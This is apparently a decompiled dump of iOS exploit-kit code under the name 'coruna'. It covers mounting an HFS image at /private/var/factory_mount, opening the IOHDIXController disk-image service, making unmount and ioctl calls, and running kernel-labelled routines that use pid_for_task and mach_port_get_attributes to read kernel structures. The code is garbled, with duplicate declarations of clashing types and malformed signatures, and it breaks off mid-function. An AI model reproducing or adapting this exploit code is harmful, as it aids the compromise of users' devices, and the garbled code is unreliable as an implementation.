  err = coruna_mount_hfs(val[1],*val,0);
  if (err == 0) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  *(uint *)(val + 2) = u;
  return;
}





void coruna_factory_mount(uint *size)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
  err = _mkdir("/private/var/factory_mount",0x1ff);
  if ((err == 0) || (err = ___error(), *err == 0x11)) {
    u = 0;
  }
  else {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  *size = u;
  return;
}





void coruna_mmap_anon_cb(uint32_t *size)
{
  int err;
  long handle;
  int *err;
  uint *ptr;
  uint u;
  
  handle = _mmap(*(uint64_t *)(size + 2),*(uint64_t *)(size + 4),size[6],0x12,*size,
                *(uint64_t *)(size + 8));
  if (handle == -1) {
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
  else {
    u = 0;
  }
  size[10] = u;
  return;
}





uint32_t
void coruna_kernel6544_via_pthread_join_2ec18(uint64_t val,uint32_t size,uint64_t id_2,uint64_t size_3,
            uint32_t flags_2,uint64_t off_4)
{
  uint32_t u;
  int err;
  uint32_t scratch[2];
  uint64_t bootargs;
  uint64_t scratch;
  uint32_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  
  serial_buf = 0xad001;
  scratch[0] = size;
  bootargs = id_2;
  scratch = size_3;
  thread_attr = flags_2;
  host_info = off_4;
  err = coruna_pthread_join_2ec18(val,coruna_mmap_anon_cb,scratch);
  u = 0x28003;
  if (err != 0) {
    u = serial_buf;
  }
  return u;
}





void coruna_unlink(int *flags)
{
  int err;
  int status;
  int *err;
  uint *ptr;
  uint u;
  char scratch [1025];
  long scratch;
  
  scratch = *(long *)k_kernel_stack_chk_guard_slot;
  status = *flags;
  _bzero(scratch,0x401);
  err = _fcntl(status,0x32);
  if ((err == 0) && (err = _unlink(scratch), err == 0)) {
    status = _close(status);
    if (status == 0) {
      u = 0;
      flags[1] = u;
      if (*(long *)k_kernel_stack_chk_guard_slot == scratch) {
      return;
      }
      ___stack_chk_fail();
    }
  }
  err = ___error();
  status = *err;
  ptr = (uint *)___error();
  u = -*ptr;
  if (-1 < status) {
    u = *ptr;
  }
  u = u | 0x40000000;
fail:
  flags[1] = u;
  if (*(long *)k_kernel_stack_chk_guard_slot == scratch) {
    return;
  }
  ___stack_chk_fail();
}





uint32_t coruna_kernel09_via_pthread_join_2ec18_2(uint64_t val,uint32_t size)
{
  uint32_t u;
  int err;
  uint32_t scratch;
  uint32_t bootargs;
  
  bootargs = 0xad001;
  scratch = size;
  err = coruna_pthread_join_2ec18(val,coruna_unlink,&scratch);
  u = 0x28003;
  if (err != 0) {
    u = bootargs;
  }
  return u;
}





uint32_t coruna_kernel09_via_pthread_join_2ec18_3(uint64_t val,uint64_t id_2,uint32_t size,uint64_t size_3)
{
  uint32_t u;
  int err;
  uint64_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  
  host_info = 0xad001;
  scratch = id_2;
  bootargs = size;
  thread_attr = size_3;
  err = coruna_pthread_join_2ec18(val,coruna_open_dprotected_temp,&scratch);
  u = 0x28003;
  if (err != 0) {
    u = host_info;
  }
  return u;
}





void coruna_open_dprotected_temp(uint64_t *val)
{
  bool err;
  int err;
  int status;
  uint u;
  uint size;
  uint *ptr;
  char *ptr;
  unsigned long version;
  int *err;
  void *ptr;
  int *status;
  char scratch [1024];
  uint8_t scratch[2168];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  ptr = (void *)*val;
  size = *(uint *)(val + 1);
  status = (int *)val[2];
  _bzero(scratch,0x878);
  ptr = (uint *)coruna_factory_mount_167c8(scratch);
  u = (uint)ptr;
  if (u == 0) {
    _snprintf(scratch,0x400,"%s/temp.XXXXXX");
    ptr = _mktemp(scratch);
    if (ptr != (char *)0x0) {
      err = _open_dprotected_np(ptr,0x602,4,0);
      if (-1 < err) {
        u = 0;
        do {
          version = _write(err,ptr,(unsigned long)size);
          if (version != 0xffffffffffffffff) {
            u = 0x1b005;
            {
              _close(err);
              size = _unlink(ptr);
              ptr = (uint *)(unsigned long)size;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
            status = _open(ptr,0);
            if (-1 < status) {
              *status = status;
              u = _close(err);
              ptr = (uint *)(unsigned long)u;
              u = 0;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
            status = ___error();
            status = *status;
            ptr = (uint *)___error();
            u = -*ptr;
            if (-1 < status) {
              u = *ptr;
            }
            u = u | 0x40000000;
            {
              _close(err);
              size = _unlink(ptr);
              ptr = (uint *)(unsigned long)size;
              *(uint *)(val + 3) = u;
              if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
              return;
              }
              ___stack_chk_fail(ptr);
            }
          }
          err = ___error();
        } while ((*err == 4) && (err = u < 100, u = u + 1, err));
        u = 0x1b005;
fail:
        _close(err);
        size = _unlink(ptr);
        ptr = (uint *)(unsigned long)size;
        *(uint *)(val + 3) = u;
        if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
        return;
        }
        ___stack_chk_fail(ptr);
      }
    }
    status = ___error();
    err = *status;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    u = u | 0x40000000;
  }
done:
  *(uint *)(val + 3) = u;
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(ptr);
}





void coruna_kernel6544_via_pthread_join_2ec18_2(uint64_t val)
{
  int err;
  int status;
  uint8_t *scratch;
  uint64_t scratch;
  int bootargs;
  uint8_t thread_attr[88];
  uint8_t host_info[1024];
  uint8_t serial_buf[1056];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(thread_attr,0x878);
  err = coruna_factory_mount_167c8(thread_attr);
  if (err == 0) {
    scratch = host_info;
    scratch = 0;
    bootargs = 0xad001;
    err = coruna_pthread_join_2ec18(val,coruna_unmount,&scratch);
    status = 0xad00b;
    if (err != 0) {
      status = bootargs;
    }
    if (status == 0) {
      scratch = serial_buf;
      scratch = 0;
      bootargs = 0xad001;
      err = coruna_pthread_join_2ec18(val,coruna_ioctl,&scratch);
      status = 0xad00b;
      if (err != 0) {
        status = bootargs;
      }
    }
  }
  else {
    status = 0;
    if (err != 0xad011) {
      status = err;
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action) {
    ___stack_chk_fail(status);
  }
  return;
}





uint coruna_factory_mount_167c8(statfs *arg)
{
  int err;
  int *err;
  uint *ptr;
  uint u;
  
  err = _statfs("/private/var/factory_mount",arg);
  u = 0xad011;
  if (err == 0) {
    err = _strcmp("/private/var/factory_mount",arg->f_mntonname);
    if (err == 0) {
      err = _strcmp("hfs",arg->f_fstypename);
      u = 0;
      if (err != 0) {
        u = 0xad005;
      }
    }
  }
  else {
    err = ___error();
    if (*err != 2) {
      err = ___error();
      err = *err;
      ptr = (uint *)___error();
      u = -*ptr;
      if (-1 < err) {
        u = *ptr;
      }
      u = u | 0x40000000;
    }
  }
  return u;
}
unsigned long coruna_newfs_hfs(long arg)

{
  int count;
  uint type_id_14;
  int j;
  unsigned long size;
  long serial_11;
  size_t ls6;
  long serial_12;
  long serial_13;
  long addr;
  uint64_t *******lpppppppu10;
  void *obj;
  uint64_t type_id_21;
  uint64_t type_id_19;
  uint64_t *******lpppppppu14;
  uint64_t type_id;
  unsigned long type_id_20;
  uint64_t *******cache_35;
  uint cache_36;
  uint8_t cache_37[2168];
  char *url_buf;
  char *cache_38;
  uint64_t *******cache_39;
  uint64_t cache_23;
  stat cache_24;
  long cache_32;
  
  cache_32 = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(cache_37,0x878);
  size = coruna_factory_mount_167c8(cache_37);
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_32) {
  ___stack_chk_fail();
  }
  return size;
}





void coruna_strlcpy(uint64_t val,uint32_t *size,char *path)
{
  uint64_t u;
  uint8_t scratch[88];
  char scratch [2080];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  _bzero(scratch,0x878);
  u = coruna_factory_mount_167c8(scratch);
  if ((int)u == 0xad011) {
    u = 0;
    *size = 0;
    *path = '\0';
  }
  else if ((int)u == 0) {
    *size = 4;
    _strlcpy(path,scratch,0x400);
    u = 0;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == bootargs) {
    return;
  }
  ___stack_chk_fail(u);
}





uint32_t coruna_nop_stub_2(void)
{
  uint32_t u;
  int err;
  
  err = coruna_kernel6544_via_kernel6544_via_kernel6544_via_nop_stub_7_3();
  u = 0xad00b;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint32_t coruna_kernel6544_residual_251(void)
{
  uint32_t u;
  int err;
  
  err = coruna_kernel6544_via_kernel6544_via_kernel6544_via_nop_stub_7_3();
  u = 0xad00b;
  if (err != 0) {
    u = 0;
  }
  return u;
}





uint * coruna_unmount(uint64_t *val)
{
  uint u;
  bool err;
  int err;
  uint size;
  int *err;
  uint *ptr;
  uint version;
  
  version = 0;
  do {
    err = _unmount((char *)*val,0x80000);
    if (err == 0) {
      ptr = (uint *)0x0;
      size = 0;
      break;
    }
    err = ___error();
    err = *err;
    ptr = (uint *)___error();
    u = -*ptr;
    if (-1 < err) {
      u = *ptr;
    }
    size = u | 0x40000000;
    if ((u | 0x40000000) != 0x40000010) break;
    size = _usleep(200);
    ptr = (uint *)(unsigned long)size;
    err = version < 4;
    size = 0x40000010;
    version = version + 1;
  } while (err);
  *(uint *)(val + 2) = size;
  return ptr;
}





uint * coruna_ioctl(uint64_t *val)
{
  int err;
  int status;
  uint u;
  uint *ptr;
  int *err;
  char *ptr;
  uint size;
  stat scratch;
  
  scratch.st_gen = 0;
  scratch.st_lspare = 0;
  scratch.st_blksize = 0;
  scratch.st_flags = 0;
  scratch.st_qspare[1] = 0;
  scratch.st_qspare[0] = 0;
  scratch.st_birthtimespec.tv_nsec = 0;
  scratch.st_birthtimespec.tv_sec = 0;
  scratch.st_blocks = 0;
  scratch.st_size = 0;
  scratch.st_mtimespec.tv_nsec = 0;
  scratch.st_mtimespec.tv_sec = 0;
  scratch.st_ctimespec.tv_nsec = 0;
  scratch.st_ctimespec.tv_sec = 0;
  scratch.st_rdev = 0;
  scratch = 0;
  scratch.st_uid = 0;
  scratch.st_gid = 0;
  scratch.st_atimespec.tv_nsec = 0;
  scratch.st_atimespec.tv_sec = 0;
  scratch.st_ino = 0;
  scratch.st_dev = 0;
  scratch.st_mode = 0;
  scratch.st_nlink = 0;
  ptr = (char *)*val;
  err = _stat(ptr,&scratch);
  if (err == 0) {
    if ((scratch.st_mode & 0xf000) != 0x6000) {
      size = 0xad013;
      ptr = (uint *)0x0;
      *(uint *)(val + 2) = size;
      return ptr;
    }
    err = _open(ptr,0);
    if (-1 < err) {
      status = _ioctl(err,0x20006415);
      if (status == 0) {
        size = 0;
      }
      else {
        err = ___error();
        status = *err;
        ptr = (uint *)___error();
        size = -*ptr;
        if (-1 < status) {
          size = *ptr;
        }
        size = size | 0x40000000;
      }
      u = _close(err);
      ptr = (uint *)(unsigned long)u;
      *(uint *)(val + 2) = size;
      return ptr;
    }
  }
  else {
    ptr = (uint *)___error();
    if (*ptr == 2) {
      size = 0;
      *(uint *)(val + 2) = size;
      return ptr;
    }
  }
  err = ___error();
  err = *err;
  ptr = (uint *)___error();
  size = -*ptr;
  if (-1 < err) {
    size = *ptr;
  }
  size = size | 0x40000000;
fail:
  *(uint *)(val + 2) = size;
  return ptr;
}





void coruna_open_ihdix(uint64_t *val)
{
  uint u;
  uint size;
  uint64_t version;
  uint32_t scratch;
  uint64_t bootargs;
  uint32_t thread_attr;
  uint64_t host_info;
  char *serial_buf;
  size_t action;
  uint64_t block_ctx;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t region;
  uint64_t plist;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t frame;
  uint64_t work;
  long cache;
  
  cache = *(long *)k_kernel_stack_chk_guard_slot;
  if (val != (uint64_t *)0x0) {
    version = coruna_ioservicegetmatchingservice("IOHDIXController");
    if ((int)version + 1U < 2) {
      *(uint32_t *)(val + 1) = 0xad011;
    }
    else {
      thread_attr = 0;
      u = _IOServiceOpen(version,*(uint32_t *)k_kernel_mach_task_self_slot,0,&thread_attr);
      if (u == 0) {
        bootargs = 4;
        scratch = 0;
        scratch = 0;
        block_ctx = 0;
        thread_attr = 0;
        bootargs = 0;
        host_info = 0;
        stack_guard = 0;
        action = 0;
        serial_buf = 0;
        block_ctx = 0;
        sa_saved = 0;
        sa_saved = 0;
        stack_guard = 0;
        sa_new = 0;
        sa_new = 0;
        path_buf = 0;
        path_buf = 0;
        tmp_buf = 0;
        tmp_buf = 0;
        region = 0;
        region = 0;
        plist = 0;
        plist = 0;
        url_buf = 0;
        url_buf = 0;
        json_buf = 0;
        json_buf = 0;
        frame = 0;
        frame = 0;
        work = 0;
        host_info = k_kernel_rodata_word_3b4e8;
        serial_buf = (char *)*val;
        action = _strlen(serial_buf);
        size = _IOConnectCallStructMethod(thread_attr,0,&host_info,0x100,&scratch,&bootargs);
        u = 0;
        if (size != 0) {
          u = size | 0x80000000;
        }
        *(uint *)(val + 1) = u;
        _IOServiceClose(thread_attr);
      }
      else {
        *(uint *)(val + 1) = u | 0x80000000;
      }
      _IOObjectRelease(version);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == cache) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_ioreg_search_cf(uint64_t *val,uint64_t id_2)
{
  int err;
  uint64_t u;
  long handle;
  long addr;
  long off;
  long base;
  uint64_t size;
  char *ptr;
  uint64_t version;
  long scratch;
  char bootargs [136];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  bootargs[0x68] = '\0';
  bootargs[0x69] = '\0';
  bootargs[0x6a] = '\0';
  bootargs[0x6b] = '\0';
  bootargs[0x6c] = '\0';
  bootargs[0x6d] = '\0';
  bootargs[0x6e] = '\0';
  bootargs[0x6f] = '\0';
  bootargs[0x60] = '\0';
  bootargs[0x61] = '\0';
  bootargs[0x62] = '\0';
  bootargs[99] = '\0';
  bootargs[100] = '\0';
  bootargs[0x65] = '\0';
  bootargs[0x66] = '\0';
  bootargs[0x67] = '\0';
  bootargs[0x78] = '\0';
  bootargs[0x79] = '\0';
  bootargs[0x7a] = '\0';
  bootargs[0x7b] = '\0';
  bootargs[0x7c] = '\0';
  bootargs[0x7d] = '\0';
  bootargs[0x7e] = '\0';
  bootargs[0x7f] = '\0';
  bootargs[0x70] = '\0';
  bootargs[0x71] = '\0';
  bootargs[0x72] = '\0';
  bootargs[0x73] = '\0';
  bootargs[0x74] = '\0';
  bootargs[0x75] = '\0';
  bootargs[0x76] = '\0';
  bootargs[0x77] = '\0';
  bootargs[0x48] = '\0';
  bootargs[0x49] = '\0';
  bootargs[0x4a] = '\0';
  bootargs[0x4b] = '\0';
  bootargs[0x4c] = '\0';
  bootargs[0x4d] = '\0';
  bootargs[0x4e] = '\0';
  bootargs[0x4f] = '\0';
  bootargs[0x40] = '\0';
  bootargs[0x41] = '\0';
  bootargs[0x42] = '\0';
  bootargs[0x43] = '\0';
  bootargs[0x44] = '\0';
  bootargs[0x45] = '\0';
  bootargs[0x46] = '\0';
  bootargs[0x47] = '\0';
  bootargs[0x58] = '\0';
  bootargs[0x59] = '\0';
  bootargs[0x5a] = '\0';
  bootargs[0x5b] = '\0';
  bootargs[0x5c] = '\0';
  bootargs[0x5d] = '\0';
  bootargs[0x5e] = '\0';
  bootargs[0x5f] = '\0';
  bootargs[0x50] = '\0';
  bootargs[0x51] = '\0';
  bootargs[0x52] = '\0';
  bootargs[0x53] = '\0';
  bootargs[0x54] = '\0';
  bootargs[0x55] = '\0';
  bootargs[0x56] = '\0';
  bootargs[0x57] = '\0';
  bootargs[0x28] = '\0';
  bootargs[0x29] = '\0';
  bootargs[0x2a] = '\0';
  bootargs[0x2b] = '\0';
  bootargs[0x2c] = '\0';
  bootargs[0x2d] = '\0';
  bootargs[0x2e] = '\0';
  bootargs[0x2f] = '\0';
  bootargs[0x20] = '\0';
  bootargs[0x21] = '\0';
  bootargs[0x22] = '\0';
  bootargs[0x23] = '\0';
  bootargs[0x24] = '\0';
  bootargs[0x25] = '\0';
  bootargs[0x26] = '\0';
  bootargs[0x27] = '\0';
  bootargs[0x38] = '\0';
  bootargs[0x39] = '\0';
  bootargs[0x3a] = '\0';
  bootargs[0x3b] = '\0';
  bootargs[0x3c] = '\0';
  bootargs[0x3d] = '\0';
  bootargs[0x3e] = '\0';
  bootargs[0x3f] = '\0';
  bootargs[0x30] = '\0';
  bootargs[0x31] = '\0';
  bootargs[0x32] = '\0';
  bootargs[0x33] = '\0';
  bootargs[0x34] = '\0';
  bootargs[0x35] = '\0';
  bootargs[0x36] = '\0';
  bootargs[0x37] = '\0';
  bootargs[8] = '\0';
  bootargs[9] = '\0';
  bootargs[10] = '\0';
  bootargs[0xb] = '\0';
  bootargs[0xc] = '\0';
  bootargs[0xd] = '\0';
  bootargs[0xe] = '\0';
  bootargs[0xf] = '\0';
  bootargs[0] = '\0';
  bootargs[1] = '\0';
  bootargs[2] = '\0';
  bootargs[3] = '\0';
  bootargs[4] = '\0';
  bootargs[5] = '\0';
  bootargs[6] = '\0';
  bootargs[7] = '\0';
  bootargs[0x18] = '\0';
  bootargs[0x19] = '\0';
  bootargs[0x1a] = '\0';
  bootargs[0x1b] = '\0';
  bootargs[0x1c] = '\0';
  bootargs[0x1d] = '\0';
  bootargs[0x1e] = '\0';
  bootargs[0x1f] = '\0';
  bootargs[0x10] = '\0';
  bootargs[0x11] = '\0';
  bootargs[0x12] = '\0';
  bootargs[0x13] = '\0';
  bootargs[0x14] = '\0';
  bootargs[0x15] = '\0';
  bootargs[0x16] = '\0';
  bootargs[0x17] = '\0';
  u = _IOIteratorNext(id_2);
  if ((int)u != 0) {
    version = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
    do {
      handle = _IORegistryEntrySearchCFProperty(u,"IOService",&cf_ota_unique_identifier,version,3);
      if (handle != 0) {
        addr = _CFGetTypeID();
        off = _CFNumberGetTypeID();
        if ((((addr == off) && (err = _CFNumberGetValue(handle,4,&scratch), err == 1)) &&
            (scratch == val[1])) &&
           (addr = _IORegistryEntryCreateCFProperty(u,&cf_BSDName,version,0), addr != 0)) {
          off = _CFGetTypeID();
          base = _CFStringGetTypeID();
          if (off == base) {
            size = _CFStringGetSystemEncoding();
            err = _CFStringGetCString(addr,bootargs,0x80,size);
            if (err == 1) {
              if ((void *)*val != (void *)0x0) {
                _free((void *)*val);
              }
              ptr = _strdup(bootargs);
              *val = ptr;
            }
          }
          _CFRelease(addr);
        }
        _CFRelease(handle);
      }
      _IOObjectRelease(u);
      u = _IOIteratorNext(id_2);
    } while ((int)u != 0);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
  ___stack_chk_fail();
}





uint64_t coruna_kernel09_residual_267(long handle,long *addr_2,long off_3)
{
  int err;
  void *ptr;
  long *buf;
  long *str;
  long handle;
  unsigned long u;
  long scratch;
  long bootargs;
  
  buf = &scratch;
  if ((char)addr_2[8] == '\0') {
    if (off_3 == 0) {
      bootargs = 0;
    }
    else {
      bootargs = off_3 - (unsigned long)*(uint *)((long)addr_2 + 100);
    }
    ptr = (void *)(*addr_2 + (unsigned long)*(uint *)((long)addr_2 + 0x5c) + 0x200);
    err = *(int *)(handle + 0x168);
    buf = &bootargs;
  }
  else {
    handle = addr_2[4];
    if (handle == 0) {
      str = addr_2 + 1;
      handle = *addr_2;
    }
    else {
      str = addr_2 + 5;
    }
    err = *(int *)(handle + 0x168);
    u = (unsigned long)(uint)((int)addr_2[9] + err * 2);
    if (off_3 == 0) {
      scratch = 0;
    }
    else {
      buf = &bootargs;
      scratch = (u - (long)err) + *str;
    }
    bootargs = off_3;
    _memcpy((void *)(handle + (unsigned long)(uint)(err * 3 + (int)addr_2[9])),&scratch,(long)err);
    ptr = (void *)(handle + u);
    err = *(int *)(handle + 0x168);
  }
  _memcpy(ptr,buf,(long)err);
  return 0;
}





uint64_t coruna_kernel09_residual_268(uint64_t *val,int flags,unsigned long arg)
{
  bool err;
  unsigned long u;
  int *err;
  long handle;
  uint size;
  
  handle = val[4];
  if (((arg & 1) != 0) || ((flags != 0 && (handle == 0)))) {
    size = 0;
    while (u = _write(*(int *)(val + 3),(void *)*val,(unsigned long)*(uint *)(val + 2)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return 0x28009;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return 0x28009;
      }
    }
    if (u >> 0x20 != 0) {
      return 0x28009;
    }
    if (*(int *)(val + 2) != (int)u) {
      return 0x28009;
    }
    u = _read(*(int *)((long)val + 0x14),(void *)*val,u & 0xffffffff);
    if (u == 0xffffffffffffffff) {
      size = 0;
      do {
        err = ___error();
        if (*err != 4) {
          return 0x2800a;
        }
        if (99 < size) {
          return 0x2800a;
        }
        size = size + 1;
        u = _read(*(int *)((long)val + 0x14),(void *)*val,(unsigned long)*(uint *)(val + 2))
        ;
      } while (u == 0xffffffffffffffff);
    }
    if (u >> 0x20 != 0) {
      return 0x2800a;
    }
    if (*(int *)(val + 2) != (int)u) {
      return 0x2800a;
    }
  }
  if (handle != 0 && flags != 0) {
    size = 0;
    while (u = _write(*(int *)(val + 7),(void *)val[4],(unsigned long)*(uint *)(val + 6)),
          u == 0xffffffffffffffff) {
      err = ___error();
      if (*err != 4) {
        return 0x28009;
      }
      err = 99 < size;
      size = size + 1;
      if (err) {
        return 0x28009;
      }
    }
    if (u >> 0x20 != 0) {
      return 0x28009;
    }
    if (*(int *)(val + 6) != (int)u) {
      return 0x28009;
    }
    u = _read(*(int *)((long)val + 0x34),(void *)val[4],u & 0xffffffff);
    if (u == 0xffffffffffffffff) {
      size = 0;
      do {
        err = ___error();
        if ((*err != 4) || (99 < size)) {
          return 0x2800a;
        }
        size = size + 1;
        u = _read(*(int *)((long)val + 0x34),(void *)val[4],
                      (unsigned long)*(uint *)(val + 6));
      } while (u == 0xffffffffffffffff);
    }
    if (u >> 0x20 != 0) {
      return 0x2800a;
    }
    if (*(int *)(val + 6) != (int)u) {
      return 0x2800a;
    }
  }
  return 0;
}





unsigned long coruna_pid_for_task_20c00(uint64_t arg,long val,uint64_t n,int *m)

{
  uint type_id_13;
  unsigned long type_id_14;
  int cache_40;
  
  coruna_kernel09_residual_267();
  type_id_14 = coruna_kernel09_residual_268(val,0,1);
  if ((int)type_id_14 == 0) {
    type_id_13 = _pid_for_task(*(mach_port_name_t *)(val + 0x3c),&cache_40);
    if (type_id_13 == 0) {
      *m = cache_40;
      type_id_14 = 0;
    }
    else {
      type_id_14 = (unsigned long)(type_id_13 | 0x80000000);
    }
  }
  return type_id_14;
}





unsigned long coruna_mach_port_get_attributes(uint64_t arg,long val,uint64_t n,integer_t *m)

{
  void (*ptr)(void);
  uint type_id_14;
  unsigned long u;
  unsigned long unaff_x30;
  integer_t cache_20 [2];
  
  if (*(char *)(val + 0x40) != '\0') {
    coruna_kernel09_residual_267(arg,val);
    u = coruna_kernel09_residual_268(val,1,0);
    if ((int)u == 0) {
      cache_20[1] = 1;
      type_id_14 = _mach_port_get_attributes
                        (*(ipc_space_t *)k_kernel_mach_task_self_slot,
                         *(mach_port_name_t *)(val + 0x3c),3,cache_20,
                         (mach_msg_type_number_t *)(cache_20 + 1));
      if (type_id_14 == 0) {
        *m = cache_20[0];
        u = 0;
      }
      else {
        u = (unsigned long)(type_id_14 | 0x80000000);
      }
    }
    return u;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_pid_for_task_20c00(arg,val,n,m);
  return u;
}





void coruna_kernel09_via_mach_port_get_attributes(uint64_t val,uint64_t id_2,long handle,uint64_t *size_3)
{
  int err;
  uint32_t scratch;
  uint32_t scratch;
  
  err = coruna_mach_port_get_attributes();
  if ((err == 0) && (err = coruna_mach_port_get_attributes(val,id_2,handle + 4,&scratch), err == 0)) {
    *size_3 = coruna_u64_pack((scratch), (scratch));
  }
  return;
}





uint64_t coruna_kernel6544_via_mach_port_get_attributes(long handle,long addr_2,unsigned long arg,uint size,unsigned long *arg)
{
  uint u;
  unsigned long size;
  int err;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  uint64_t kind;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint scratch;
  
  version = coruna_return_zero_2b2d0();
  if ((int)version == 0) {
    kind = 0x2800b;
  }
  else if (arg == 0) {
    kind = 0x28008;
  }
  else {
    port = coruna_kernel6544_residual_259(handle,version,version);
    tag = coruna_kernel6544_residual_260(handle,arg,version,port);
    if (tag != 0) {
      type_id = *(unsigned long *)(handle + 0x158);
      for (type_id_9 = arg; tag <= type_id_9; type_id_9 = type_id_9 - (version & 0xffffffff)) {
        if (addr_2 == 0) {
          err = coruna_kernel6544_via_fcntl_1bf84(handle,type_id_9,&scratch);
          if (err != 1) {
            return 0x2800f;
          }
        }
        else {
          kind = coruna_mach_port_get_attributes(handle,addr_2,type_id_9,&scratch);
          if ((int)kind != 0) {
            return kind;
          }
        }
        u = scratch & 0x3ff;
        if (type_id < 0x1c1b1914600000) {
          *arg = type_id_9;
          return 0;
        }
        else if ((size == 2) && (u == 2)) {
          err = coruna_kernel6544_via_kernel09_via_mach_port_get_attributes(handle,addr_2,scratch,type_id_9);
          *arg = type_id_9;
          return 0;
        }
        *arg = type_id_9;
        return 0;
      }
      type_id_9 = arg;
joined_r0x00017954:
      do {
        while( true ) {
          type_id_9 = (version & 0xffffffff) + type_id_9;
          if (((port & 0xffffffff) - (version & 0xffffffff)) + tag < type_id_9) {
            return 0x2800c;
          }
          if (addr_2 == 0) {
            err = coruna_kernel6544_via_fcntl_1bf84(handle,type_id_9,&scratch);
            if (err != 1) {
              return 0x2800f;
            }
          }
          else {
            kind = coruna_mach_port_get_attributes(handle,addr_2,type_id_9,&scratch);
            if ((int)kind != 0) {
              return kind;
            }
          }
          u = scratch & 0x3ff;
          if (0x1c1b19145fffff < type_id) break;
          *arg = type_id_9;
          return 0;
        }
        if ((size != 2) || (u != 2)) {
          *arg = type_id_9;
          return 0;
        }
        err = coruna_kernel6544_via_kernel09_via_mach_port_get_attributes(handle,addr_2,scratch,type_id_9);
        if (err == 0) {
fail:
          *arg = type_id_9;
          return 0;
        }
      } while( true );
    }
    kind = 0x28026;
  }
  return kind;
}





unsigned long coruna_kernel6544_via_kernel09_via_mach_port_get_attributes(uint64_t arg,long val,uint n,uint64_t m)

{
  uint type_id_13;
  uint type_id_14;
  int j;
  unsigned long size;
  long serial_11;
  long cache_20;
  
  type_id_13 = 0x28026;
  if ((n & 0x7ff) != 2) {
    return 0x28008;
  }
  cache_20 = coruna_return_zero_2af7c(arg,m);
  if (cache_20 != 0) {
    if (val == 0) {
      j = coruna_kernel6544_residual_256(arg,cache_20,&cache_20);
      if (j != 1) {
        return 0x2800f;
      }
    }
    else {
      size = coruna_kernel09_via_mach_port_get_attributes(arg,val,cache_20,&cache_20);
      if ((int)size != 0) {
        return size;
      }
      cache_20 = coruna_kernel6544_via_ctx_test_flag_5(arg,cache_20);
    }
    serial_11 = coruna_ptr_canonicalize(arg,cache_20);
    if (serial_11 != 0) {
      type_id_14 = coruna_return_zero_2ba94(arg);
      if (type_id_14 == 0) {
        return 0x28026;
      }
      if (val == 0) {
        j = coruna_kernel6544_residual_256(arg,cache_20 + (unsigned long)type_id_14,&cache_20);
        if (j != 1) {
          return 0x2800f;
        }
        j = coruna_kernel6544_residual_256(arg,cache_20 + 0x20,&cache_20);
        if (j != 1) {
          return 0x2800f;
        }
      }
      else {
        size = coruna_kernel09_via_mach_port_get_attributes(arg,val,cache_20 + (unsigned long)type_id_14,&cache_20);
        if ((int)size != 0) {
          return size;
        }
        cache_20 = coruna_kernel6544_via_ctx_test_flag_5(arg,cache_20);
        size = coruna_kernel09_via_mach_port_get_attributes(arg,val,cache_20 + 0x20,&cache_20);
        if ((int)size != 0) {
          return size;
        }
      }
      serial_11 = coruna_ptr_canonicalize(arg,cache_20);
      if (serial_11 != 0) {
        type_id_13 = 0;
      }
      return (unsigned long)type_id_13;
    }
  }
  return 0x28026;
}





void coruna_kernel6544_via_kernel6544_via_mach_port_get_attributes(void)
{
  coruna_kernel6544_via_mach_port_get_attributes();
  return;
}





uint32_t coruna_fileport_makeport_16e4c(long handle,uint64_t val)
{
  int err;
  long handle;
  uint32_t u;
  int scratch;
  uint32_t bootargs;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x1f53) {
